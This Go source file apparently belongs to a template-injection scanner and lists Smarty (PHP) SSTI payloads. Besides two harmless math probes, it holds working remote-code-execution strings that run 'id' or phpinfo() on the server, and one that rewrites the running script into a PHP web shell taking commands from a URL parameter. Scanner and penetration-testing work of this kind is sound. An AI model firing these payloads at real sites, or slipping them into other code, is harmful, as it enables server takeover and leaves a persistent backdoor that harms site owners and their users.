package ssti

// Smarty payloads (PHP).
// Source: PayloadsAllTheThings, HackTricks
var smartyPayloads = []Payload{
	// Detection payloads
	{
		Value:           "{7*7}",
		Engine:          EngineSmarty,
		Type:            TypeDetection,
		Description:     "Basic Smarty math expression",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	{
		Value:           "{math equation=\"7*7\"}",
		Engine:          EngineSmarty,
		Type:            TypeDetection,
		Description:     "Smarty math function",
		DetectionMethod: MethodMath,
		ExpectedOutput:  "49",
	},
	// RCE payloads (Smarty <= 3.x)
	{
		Value:           "{php}echo `id`;{/php}",
		Engine:          EngineSmarty,
		Type:            TypeRCE,
		Description:     "Smarty PHP tag RCE",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	{
		Value:           "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
		Engine:          EngineSmarty,
		Type:            TypeRCE,
		Description:     "Smarty file write RCE",
		DetectionMethod: MethodOutput,
	},
	{
		Value:           "{system('id')}",
		Engine:          EngineSmarty,
		Type:            TypeRCE,
		Description:     "Smarty system function",
		DetectionMethod: MethodOutput,
		ExpectedOutput:  "uid=",
	},
	// Smarty 3.x with security disabled
	{
		Value:           "{if phpinfo()}{/if}",
		Engine:          EngineSmarty,
		Type:            TypeRCE,
		Description:     "Smarty conditional RCE",
		DetectionMethod: MethodReflection,
		ExpectedOutput:  "PHP Version",
	},
}
